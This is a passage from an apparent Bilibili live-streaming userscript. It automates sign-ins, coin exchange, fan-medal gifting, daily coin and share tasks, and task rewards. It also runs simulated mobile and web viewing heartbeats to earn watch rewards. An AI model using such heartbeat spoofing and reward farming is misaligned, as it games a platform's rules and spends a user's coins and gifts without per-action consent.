                    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = 0;

                    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER === undefined) config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER;
                    config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = parseInt(config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER, 10);
                    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER < 0) config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = 0;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE = 1;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT = 0;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT = 1;
                    if($.type(CONFIG.AUTO_GIFT_CONFIG.ROOMID)!='array'){
                        CONFIG.AUTO_GIFT_CONFIG.ROOMID = [0];
                    }
                    if($.type(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID)!='array'){
                        CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID = [0];
                    }
                    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL === undefined) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = Essential.Config.AUTO_GIFT_CONFIG.GIFT_INTERVAL;
                    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL < 1) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = 1;
                    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT === undefined) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = Essential.Config.AUTO_GIFT_CONFIG.GIFT_LIMIT;
                    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT < 0) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = 86400;
                    if (config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE === undefined) config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE = Essential.Config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
                    if (config.DD_BP === undefined) config.DD_BP = Essential.Config.DD_BP;
                    if (config.DD_DM_STORM === undefined) config.DD_DM_STORM = Essential.Config.DD_DM_STORM;
                    return config;
                },
                _copy: (obj) => {
                    return JSON.parse(JSON.stringify(obj));
                },
                load: () => {
                    try {
                        CONFIG = JSON.parse(localStorage.getItem(`${NAME}_CONFIG`)) || {};
                        CONFIG = Essential.Config.fix(CONFIG);
                        if (Object.prototype.toString.call(CONFIG) !== '[object Object]') throw new Error();
                    } catch (e) {
                        CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
                    }
                    Essential.Config.recurLoad(CONFIG);
                    DEBUG('Essential.Config.load: CONFIG', CONFIG);
                    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
                    BiliPushUtils.Check.sleepTimeRangeBuild();
                },
                save: () => {
                    CONFIG = Essential.Config.recurSave(CONFIG);
                    CONFIG = Essential.Config.fix(CONFIG);
                    Essential.DataSync.down();
                    DEBUG('Essential.Config.save: CONFIG', CONFIG);
                    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
                    window.toast('设置已保存，部分设置需要刷新后生效', 'success');
                },
                clear: () => {
                    CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
                    Essential.DataSync.down();
                    localStorage.removeItem(`${NAME}_CONFIG`);
                }
            }, // Need Init After Toast.init and AlertDialog.init
            Cache: {
                load: () => {
                    try {
                        CACHE = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
                        if (Object.prototype.toString.call(CACHE) !== '[object Object]') throw new Error();
                        if (CACHE.version !== VERSION){
                            CACHE.version = VERSION;
                            //Essential.Cache.clear();
                        }
                    } catch (err) {
                        CACHE = {
                            version: VERSION
                        };
                        localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                    }
                    DEBUG('Essential.Cache.load: CACHE', CACHE);
                },
                save: () => {
                    localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                },
                clear: () => {
                    CACHE = {
                        version: VERSION
                    };
                    Essential.DataSync.down();
                    localStorage.removeItem(`${NAME}_CACHE`);
                }
            },
            DataSync: {
                init: () => {
                    window[NAME] = {};
                    window[NAME].iframeSet = new Set();
                },
                down: () => {
                    try {
                        window[NAME].Info = Info;
                        window[NAME].CONFIG = CONFIG;
                        window[NAME].CACHE = CACHE;
                        for (const iframe of window[NAME].iframeSet) {
                            if (iframe.promise.down) iframe.promise.down.resolve();
                        }
                    } catch (err) {
                    }
                }
            }
        }; // Only Run in MainScript, Need Init after Toast.init

        const Sign = {
            run: () => {
                try {
                    if (!CONFIG.AUTO_SIGN) return $.Deferred().resolve();
                    if (CACHE.sign_ts && !checkNewDay(CACHE.sign_ts)) {
                        // 同一天，不再检查签到
                        runTomorrow(Sign.run);
                        return $.Deferred().resolve();
                    }
                    return API.sign.doSign().then((response) => {
                        DEBUG('Sign.run: API.sign.doSign', response);
                        if (response.code === 0) {
                            // 签到成功
                            window.toast(`[自动签到]${response.data.text}`, 'success');
                            CACHE.sign_ts = ts_ms();
                            Essential.Cache.save();
                        } else if (response.code === -500 || response.message.indexOf('已') > -1) {
                            // 今天已签到过
                        } else {
                            window.toast(`[自动签到]${response.data.text}`, 'caution');
                            return Sign.run();
                        }
                        runTomorrow(Sign.run);
                    }, () => {
                        window.toast('[自动签到]签到失败，请检查网络', 'error');
                        return delayCall(() => Sign.run());
                    });
                } catch (err) {
                    window.toast('[自动签到]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day

        const Exchange = {
            run: () => {
                try {
                    if (!CONFIG.SILVER2COIN) return $.Deferred().resolve();
                    if (CACHE.exchange_ts && !checkNewDay(CACHE.exchange_ts)) {
                        // 同一天，不再兑换硬币
                        runTomorrow(Exchange.run);
                        return $.Deferred().resolve();
                    }
                    return Exchange.silver2coin().then(() => {
                        CACHE.exchange_ts = ts_ms();
                        Essential.Cache.save();
                        runTomorrow(Exchange.run);
                    }, () => delayCall(() => Exchange.run()));
                } catch (err) {
                    window.toast('[银瓜子换硬币]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            silver2coin: () => {
                return API.Exchange.silver2coin().then((response) => {
                    DEBUG('Exchange.silver2coin: API.SilverCoinExchange.silver2coin', response);
                    if (response.code === 0) {
                        // 兑换成功
                        window.toast(`[银瓜子换硬币]${response.msg}`, 'success');
                    } else if (response.code === 403) {
                        // 每天最多能兑换 1 个
                        // 银瓜子余额不足
                        // window.toast(`[银瓜子换硬币]'${response.msg}`, 'info');
                    } else {
                        window.toast(`[银瓜子换硬币]${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[银瓜子换硬币]兑换失败，请检查网络', 'error');
                    return delayCall(() => Exchange.silver2coin());
                });
            }
        }; // Once Run every day

        const Gift = {
            interval: 600e3,
            run_timer: undefined,
            ruid: undefined,
            room_id: undefined,
            medal_list: undefined,
            bag_list: undefined,
            time: undefined,
            remain_feed: undefined,
            light_gift:30607,
            getMedalList: (page = 1) => {
                if (page === 1) Gift.medal_list = [];
                return API.i.medal(page, 25).then((response) => {
                    DEBUG('Gift.getMedalList: API.i.medal', response);
                    Gift.medal_list = Gift.medal_list.concat(response.data.fansMedalList);
                    if (response.data.pageinfo.curPage < response.data.pageinfo.totalpages) return Gift.getMedalList(page + 1);
                }, () => {
                    window.toast('[自动送礼]获取勋章列表失败，请检查网络', 'error');
                    return delayCall(() => Gift.getMedalList(page));
                });
            },
            getBagList: () => {
                return API.gift.bag_list().then((response) => {
                    DEBUG('Gift.getBagList: API.gift.bag_list', response);
                    Gift.bag_list = response.data.list;
                    Gift.time = response.data.time;
                }, () => {
                    window.toast('[自动送礼]获取包裹列表失败，请检查网络', 'error');
                    return delayCall(() => Gift.getBagList());
                });
            },
            getFeedByGiftID: (gift_id) => {
                for (let i = Info.gift_list.length - 1; i >= 0; --i) {
                    if (Info.gift_list[i].id === gift_id) {
                        return Math.ceil(Info.gift_list[i].price / 100);
                    }
                }
                return 0;
            },
            sort_medals:(medals)=>{
                if(CONFIG.AUTO_GIFT_CONFIG.GIFT_SORT){
                    medals.sort((a,b)=>{
                        if(b.level-a.level==0){
                            return b.intimacy-a.intimacy;
                        }
                        return b.level-a.level;
                    });
                }else{
                    medals.sort((a,b)=>{
                        if(a.level-b.level==0){
                            return a.intimacy-b.intimacy;
                        }
                        return a.level-b.level;
                    });
                }
                if(CONFIG.AUTO_GIFT_CONFIG.ROOMID && CONFIG.AUTO_GIFT_CONFIG.ROOMID.length>0){
                    let sortRooms = CONFIG.AUTO_GIFT_CONFIG.ROOMID;
                    sortRooms.reverse();
                    for(let froom of sortRooms){
                        let rindex = medals.findIndex(r=>r.roomid==froom);
                        if(rindex!=-1){
                            let tmp = medals[rindex];
                            medals.splice(rindex,1);
                            medals.unshift(tmp);
                        }
                    }
                }
                return medals;
            },
            auto_light:async()=>{
                try{
                    const feed = Gift.getFeedByGiftID(Gift.light_gift);
                    let medal_list = Gift.medal_list;
                    let noLightMedals = medal_list.filter(it=>it.is_lighted==0 && it.day_limit-it.today_feed>=feed && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp=>exp==it.roomid)==-1);
                    if(noLightMedals && noLightMedals.length>0){
                        noLightMedals = Gift.sort_medals(noLightMedals);
                        await Gift.getBagList();
                        let heartBags = Gift.bag_list.filter(r=>r.gift_id==Gift.light_gift);
                        if(heartBags && heartBags.length > 0){
                            for(let medal of noLightMedals){
                                let gift = heartBags.find(it=>it.gift_id==Gift.light_gift && it.gift_num > 0);
                                if(gift){
                                    let remain_feed = medal.day_limit - medal.today_feed;
                                    if(remain_feed - feed >= 0){
                                        let response = await API.room.room_init(parseInt(medal.roomid, 10));
                                        let send_room_id = parseInt(response.data.room_id, 10);
                                        let feed_num = 1;
                                        let rsp=await API.gift.bag_send(Info.uid, gift.gift_id, medal.target_id, feed_num, gift.bag_id, send_room_id, Info.rnd)
                                        if (rsp.code === 0) {
                                            gift.gift_num -= feed_num;
                                            medal.today_feed += feed_num * feed;
                                            remain_feed -= feed_num * feed;
                                            window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮成功，送出${feed_num}个${gift.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`, 'success');
                                        } else {
                                            window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮异常:${response.msg}`, 'caution');
                                        }
                                    }
                                    continue;
                                }
                                break;
                            }
                        }
                    }
                }catch(e){
                    console.error(e);
                    window.toast(`[自动送礼]点亮勋章 检查出错:${e}`, 'error');
                }
            },
            run: async () => {
                const func = () => {
                    window.toast('[自动送礼]送礼失败，请检查网络', 'error');
                    return delayCall(() => Gift.run());
                };
                try {
                    if (!CONFIG.AUTO_GIFT) return $.Deferred().resolve();
                    if (Gift.run_timer) clearTimeout(Gift.run_timer);
                    Gift.interval = CONFIG.AUTO_GIFT_CONFIG.GIFT_INTERVAL * 60e3;
                    if (CACHE.gift_ts) {
                        const diff = ts_ms() - CACHE.gift_ts;
                        if (diff < Gift.interval) {
                            Gift.run_timer = setTimeout(Gift.run, Gift.interval - diff);
                            return $.Deferred().resolve();
                        }
                    }
                    await Gift.getMedalList();
                    let medal_list = Gift.medal_list;
                    if(CONFIG.AUTO_GIFT_CONFIG.AUTO_LIGHT){
                        await Gift.auto_light();
                    }
                    DEBUG('Gift.run: Gift.getMedalList().then: Gift.medal_list', Gift.medal_list);
                    if(medal_list && medal_list.length>0){
                        medal_list = medal_list.filter(it=>it.day_limit-it.today_feed>0 && it.level < 20);
                        medal_list = Gift.sort_medals(medal_list);
                        if(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.length>0){
                            medal_list = medal_list.filter(r=>CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp=>exp==r.roomid)==-1);
                        }
                        let limit = CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT;
                        for(let v of medal_list){
                            let response = await API.room.room_init(parseInt(v.roomid, 10));
                            Gift.room_id = parseInt(response.data.room_id, 10);
                            Gift.ruid = v.target_id;
                            Gift.remain_feed = v.day_limit - v.today_feed;
                            if(Gift.remain_feed > 0){
                                await Gift.getBagList();
                                let now = ts_s();
                                if(!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL){
                                    //送之前查一次有没有可送的
                                    let pass = Gift.bag_list.filter(r=>![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 && r.expire_at > now && (r.expire_at - now < limit));
                                    if(pass.length==0){
                                        break;
                                    }
                                }
                                CACHE.gift_ts = ts_ms();
                                Essential.Cache.save();
                                if (Gift.remain_feed > 0) {
                                    window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度未满[${v.today_feed}/${v.day_limit}]，预计需要[${Gift.remain_feed}]送礼开始`, 'info');
                                    await Gift.sendGift(v);
                                    if(!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL){
                                        let pass = Gift.bag_list.filter(r=>![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 && r.expire_at > now && (r.expire_at - now < limit));
                                        if(pass.length==0){
                                            break;
                                        }
                                    }
                                } else {
                                    window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度已满`, 'info');
                                }
                            }
                        }
                    }
                    setTimeout(Gift.run, Gift.interval);
                } catch (err) {
                    func();
                    window.toast('[自动送礼]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            sendGift: (medal,i = 0) => {
                if (i >= Gift.bag_list.length) {
                    return $.Deferred().resolve();
                }
                if (Gift.remain_feed <= 0) {
                    window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼结束，今日亲密度已满[${medal.today_feed}/${medal.day_limit}]`, 'info');
                    return $.Deferred().resolve();
                }
                if (Gift.time <= 0) Gift.time = ts_s();
                const v = Gift.bag_list[i];
                if ((
                    //特殊礼物排除
                    (![4, 3, 9, 10].includes(v.gift_id)
                     //满足到期时间
                     && v.expire_at > Gift.time && (v.expire_at - Gift.time < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT)
                    )
                    //或者全部送满
                    || CONFIG.AUTO_GIFT_CONFIG.SEND_ALL)
                    //永久礼物不自动送
                    && v.expire_at > Gift.time){
                    // 检查SEND_ALL和礼物到期时间 送当天到期的
                    const feed = Gift.getFeedByGiftID(v.gift_id);
                    if (feed > 0) {
                        let feed_num = Math.floor(Gift.remain_feed / feed);
                        if (feed_num > v.gift_num) feed_num = v.gift_num;
                        if (feed_num > 0) {
                            return API.gift.bag_send(Info.uid, v.gift_id, Gift.ruid, feed_num, v.bag_id, Gift.room_id, Info.rnd).then((response) => {
                                DEBUG('Gift.sendGift: API.gift.bag_send', response);
                                if (response.code === 0) {
                                    v.gift_num -= feed_num;
                                    medal.today_feed += feed_num * feed;
                                    Gift.remain_feed -= feed_num * feed;
                                    window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼成功，送出${feed_num}个${v.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${Gift.remain_feed}]`, 'success');
                                } else {
                                    window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼异常:${response.msg}`, 'caution');
                                }
                                return Gift.sendGift(medal,i + 1);
                            }, () => {
                                window.toast('[自动送礼]包裹送礼失败，请检查网络', 'error');
                                return delayCall(() => Gift.sendGift(medal,i));
                            });
                        }
                    }
                }
                return Gift.sendGift(medal,i + 1);
            }
        }; // Once Run every 10 minutes

        const GroupSign = {
            getGroups: () => {
                return API.Group.my_groups().then((response) => {
                    DEBUG('GroupSign.getGroups: API.Group.my_groups', response);
                    if (response.code === 0) return $.Deferred().resolve(response.data.list);
                    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
                    return $.Deferred().reject();
                }, () => {
                    window.toast('[自动应援团签到]获取应援团列表失败，请检查网络', 'error');
                    return delayCall(() => GroupSign.getGroups());
                });
            },
            signInList: (list, i = 0) => {
                if (i >= list.length) return $.Deferred().resolve();
                const obj = list[i];
                //自己不能给自己的应援团应援
                if(obj.owner_uid==Info.uid) return GroupSign.signInList(list, i + 1);
                return API.Group.sign_in(obj.group_id, obj.owner_uid).then((response) => {
                    DEBUG('GroupSign.signInList: API.Group.sign_in', response);
                    const p = $.Deferred();
                    if (response.code === 0) {
                        if (response.data.add_num > 0) {
                            window.toast(`[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到成功，当前勋章亲密度+${response.data.add_num}`, 'success');
                            p.resolve();
                        } else if (response.data.status === 1) {
                            p.resolve();
                        } else {
                            p.reject();
                        }
                    } else {
                        window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
                        return GroupSign.signInList(list, i);
                    }
                    return $.when(GroupSign.signInList(list, i + 1), p);
                }, () => {
                    window.toast(`[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到失败，请检查网络`, 'error');
                    return delayCall(() => GroupSign.signInList(list, i));
                });
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_GROUP_SIGN) return $.Deferred().resolve();
                    if (CACHE.group_sign_ts && !checkNewDay(CACHE.group_sign_ts)) {
                        // 同一天，不再检查应援团签到
                        runTomorrow(GroupSign.run);
                        return $.Deferred().resolve();
                    }
                    return GroupSign.getGroups().then((list) => {
                        return GroupSign.signInList(list).then(() => {
                            CACHE.group_sign_ts = ts_ms();
                            runTomorrow(GroupSign.run);
                        }, () => delayCall(() => GroupSign.run()));
                    }, () => delayCall(() => GroupSign.run()));
                } catch (err) {
                    window.toast('[自动应援团签到]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day "api.live.bilibili.com"
        const DailyReward = {
            coin_exp: 0,
            login: () => {
                return API.DailyReward.login().then(() => {
                    DEBUG('DailyReward.login: API.DailyReward.login');
                    window.toast('[自动每日奖励][每日登录]完成', 'success');
                }, () => {
                    window.toast('[自动每日奖励][每日登录]完成失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.login());
                });
            },
            watch: (aid, cid) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.WATCH) return $.Deferred().resolve();
                return API.DailyReward.watch(aid, cid, Info.uid, ts_s()).then((response) => {
                    DEBUG('DailyReward.watch: API.DailyReward.watch', response);
                    if (response.code === 0) {
                        window.toast(`[自动每日奖励][每日观看]完成(av=${aid})`, 'success');
                    } else {
                        window.toast(`[自动每日奖励][每日观看]'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励][每日观看]完成失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.watch(aid, cid));
                });
            },
            coin: (cards, n, i = 0, one = false) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.COIN) return $.Deferred().resolve();
                if (DailyReward.coin_exp >= CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER * 10) {
                    window.toast('[自动每日奖励][每日投币]今日投币已完成', 'info');
                    return $.Deferred().resolve();
                }
                if (i >= cards.length) {
                    window.toast('[自动每日奖励][每日投币]动态里可投币的视频不足', 'caution');
                    return $.Deferred().resolve();
                }
                const obj = JSON.parse(cards[i].card);
                let num = Math.min(2, n);
                if (one) num = 1;
                return API.DailyReward.coin(obj.aid, num).then((response) => {
                    DEBUG('DailyReward.coin: API.DailyReward.coin', response);
                    if (response.code === 0) {
                        DailyReward.coin_exp += num * 10;
                        window.toast(`[自动每日奖励][每日投币]投币成功(av=${obj.aid},num=${num})`, 'success');
                        return DailyReward.coin(cards, n - num, i + 1);
                    } else if (response.code === -110) {
                        window.toast('[自动每日奖励][每日投币]未绑定手机，已停止', 'error');
                        return $.Deferred().reject();
                    } else if (response.code === 34003) {
                        // 非法的投币数量
                        if (one) return DailyReward.coin(cards, n, i + 1);
                        return DailyReward.coin(cards, n, i, true);
                    } else if (response.code === 34005) {
                        // 塞满啦！先看看库存吧~
                        return DailyReward.coin(cards, n, i + 1);
                    }
                    window.toast(`[自动每日奖励][每日投币]'${response.msg}`, 'caution');
                    return DailyReward.coin(cards, n, i + 1);
                }, () => delayCall(() => DailyReward.coin(cards, n, i)));
            },
            share: (aid) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.SHARE) return $.Deferred().resolve();
                return API.DailyReward.share(aid).then((response) => {
                    DEBUG('DailyReward.share: API.DailyReward.share', response);
                    if (response.code === 0) {
                        window.toast(`[自动每日奖励][每日分享]分享成功(av=${aid})`, 'success');
                    } else if (response.code === 71000) {
                        // 重复分享
                        window.toast('[自动每日奖励][每日分享]今日分享已完成', 'info');
                    } else {
                        window.toast(`[自动每日奖励][每日分享]'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励][每日分享]分享失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.share(aid));
                });
            },
            dynamic: () => {
                return API.dynamic_svr.dynamic_new(Info.uid, 8).then((response) => {
                    DEBUG('DailyReward.dynamic: API.dynamic_svr.dynamic_new', response);
                    if (response.code === 0) {
                        if (response.data.cards[0]) {
                            const obj = JSON.parse(response.data.cards[0].card);
                            const p1 = DailyReward.watch(obj.aid, obj.cid);
                            const p2 = DailyReward.coin(response.data.cards, Math.max(CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER - DailyReward.coin_exp / 10, 0));
                            const p3 = DailyReward.share(obj.aid);
                            return $.when(p1, p2, p3);
                        } else {
                            window.toast('[自动每日奖励]"动态-投稿视频"中暂无动态', 'info');
                        }
                    } else {
                        window.toast(`[自动每日奖励]获取"动态-投稿视频"'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励]获取"动态-投稿视频"失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.dynamic());
                });
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_DAILYREWARD) return $.Deferred().resolve();
                    if (CACHE.dailyreward_ts && !checkNewDay(CACHE.dailyreward_ts)) {
                        // 同一天，不执行每日任务
                        runTomorrow(DailyReward.run);
                        return $.Deferred().resolve();
                    }
                    return API.DailyReward.exp().then((response) => {
                        DEBUG('DailyReward.run: API.DailyReward.exp', response);
                        if (response.code === 0) {
                            DailyReward.coin_exp = response.number;
                            DailyReward.login();
                            return DailyReward.dynamic().then(() => {
                                CACHE.dailyreward_ts = ts_ms();
                                runTomorrow(DailyReward.run);
                            });
                        } else {
                            window.toast(`[自动每日奖励]${response.message}`, 'caution');
                        }
                    }, () => {
                        window.toast('[自动每日奖励]获取每日奖励信息失败，请检查网络', 'error');
                        return delayCall(() => DailyReward.run());
                    });
                } catch (err) {
                    window.toast('[自动每日奖励]运行时出现异常', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day "api.live.bilibili.com"
        const Task = {
            interval: 600e3,
            double_watch_task: false,
            run_timer: undefined,
            MobileHeartbeat: false,
            PCHeartbeat:false,
            run: async () => {
                try {
                    if (!CONFIG.AUTO_TASK) return $.Deferred().resolve();
                    if (!Info.mobile_verify) {
                        window.toast('[自动完成任务]未绑定手机，已停止', 'caution');
                        return $.Deferred().resolve();
                    }
                    if (Task.run_timer) clearTimeout(Task.run_timer);
                    if (CACHE.task_ts && !Task.MobileHeartbeat && !Task.PCHeartbeat) {
                        const diff = ts_ms() - CACHE.task_ts;
                        if (diff < Task.interval) {
                            Task.run_timer = setTimeout(Task.run, Task.interval - diff);
                            return $.Deferred().resolve();
                        }
                    }
                    if (Task.MobileHeartbeat) Task.MobileHeartbeat = false;
                    if (Task.PCHeartbeat) Task.PCHeartbeat = false;
                    return API.i.taskInfo().then(async (response) => {
                        DEBUG('Task.run: API.i.taskInfo', response);
                        for (const key in response.data) {
                            if (typeof response.data[key] === 'object') {
                                if (response.data[key].task_id && response.data[key].status === 1) {
                                    await Task.receiveAward(response.data[key].task_id);
                                }else if (response.data[key].task_id === 'double_watch_task'){
                                    if(response.data[key].status === 0){
                                        Task.double_watch_task = false;
                                        if(Token && TokenUtil && Info.appToken && !Task.double_watch_task){
                                            await BiliPushUtils.API.Heart.mobile_info();
                                        }
                                    }else if(response.data[key].status === 2){
                                        Task.double_watch_task = true;
                                    }else{
                                        Task.double_watch_task = false;
                                    }
                                }
                            }
                        }
                    }).always(() => {
                        CACHE.task_ts = ts_ms();
                        localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                        Task.run_timer = setTimeout(Task.run, Task.interval);
                    }, () => delayCall(() => Task.run()));
                } catch (err) {
                    window.toast('[自动完成任务]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            receiveAward: async (task_id) => {
                return API.activity.receive_award(task_id).then((response) => {
                    DEBUG('Task.receiveAward: API.activity.receive_award', response);
                    if (response.code === 0) {
                        // 完成任务
                        window.toast(`[自动完成任务]完成任务：${task_id}`, 'success');
                        if (task_id === 'double_watch_task') Task.double_watch_task = true;
                    } else if (response.code === -400) {
                        // 奖励已领取
                        // window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'info');
                    } else {
                        window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动完成任务]完成任务失败，请检查网络', 'error');
                    return delayCall(() => Task.receiveAward(task_id));
                });
            }
        }; // Once Run every 10 minutes
        const MobileHeartbeat = {
            run_timer: undefined,
            run:async () => {
                try {
                    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
                    if(Task.double_watch_task) return $.Deferred().resolve();
                    if (MobileHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
                        Task.MobileHeartbeat = true;
                        Task.run();
                    }
                    if (MobileHeartbeat.run_timer) clearTimeout(MobileHeartbeat.run_timer);
                    //API.HeartBeat.mobile
                    BiliPushUtils.API.Heart.mobile().then((rsp) => {
                        DEBUG('MobileHeartbeat.run: API.HeartBeat.mobile');
                        MobileHeartbeat.run_timer = setTimeout(MobileHeartbeat.run, 300e3);
                    }, () => delayCall(() => MobileHeartbeat.run()));
                } catch (err) {
                    window.toast('[移动端心跳]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 5mins
        const WebHeartbeat = {
            run_timer: undefined,
            run: () => {
                try {
                    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
                    if (WebHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
                        Task.WebHeartbeat = true;
                        Task.run();
                    }
                    if (WebHeartbeat.run_timer) clearTimeout(WebHeartbeat.run_timer);
                    API.HeartBeat.web().then(() => {
                        DEBUG('MobileHeartbeat.run: API.HeartBeat.web');
                        WebHeartbeat.run_timer = setTimeout(WebHeartbeat.run, 300e3);
                    }, () => delayCall(() => WebHeartbeat.run()));
                } catch (err) {
                    window.toast('[WEB端心跳]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 5mins

        const TreasureBox = {
            timer: undefined,
            time_end: undefined,
            time_start: undefined,
            promise: {
                calc: undefined,
                timer: undefined
            },
            DOM: {
                image: undefined,
                canvas: undefined,
                div_tip: undefined,
                div_timer: undefined
            },
            init: () => {
                if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().resolve();
                const p = $.Deferred();
                runUntilSucceed(() => {
                    try {
                        if ($('.draw-box.gift-left-part').length) {
                            window.toast('[自动领取瓜子]当前直播间有实物抽奖，暂停领瓜子功能', 'caution');
                            p.resolve();
                            return true;
                        }
                        let treasure_box = $('#gift-control-vm div.treasure-box.p-relative');
                        if (!treasure_box.length) return false;
                        treasure_box = treasure_box.first();
                        treasure_box.attr('id', 'old_treasure_box');
                        treasure_box.hide();
                        const div = $(`<div id="${NAME}_treasure_div" class="treasure-box p-relative" style="min-width: 46px;display: inline-block;float: left;padding: 22px 0 0 15px;"></div>`);
                        TreasureBox.DOM.div_tip = $(`<div id="${NAME}_treasure_div_tip" class="t-center b-box none-select">自动<br>领取中</div>`);
